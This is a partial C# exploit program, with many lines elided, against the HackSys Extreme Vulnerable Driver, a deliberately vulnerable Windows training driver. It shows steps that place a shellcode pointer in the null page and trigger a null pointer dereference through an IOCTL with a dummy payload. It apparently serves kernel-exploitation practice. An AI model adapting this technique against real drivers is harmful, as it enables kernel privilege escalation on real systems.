...
namespace NullPointerDereference
{
    class Program
    {
        ...
        static void Main()
        {
            ...
            Console.WriteLine("--[ HEVD Exploitation : Null Pointer Dereference\n");
            ...
            // Step 2: Set shellcode pointer in null page.
            ...
            Marshal.Copy(pointer, 0, new IntPtr(4), 4);
            Console.WriteLine("[+] Null page allocation and shellcode pointer setting are successful");
            ...
            // Step 4: Trigger null pointer dereference
            uint ioctl = 0x22202B;
            byte[] payload = BitConverter.GetBytes((uint)0xdeadbeef);
            int BytesReturned = 0;

            Console.WriteLine("[>] Triggering null pointer dereference");
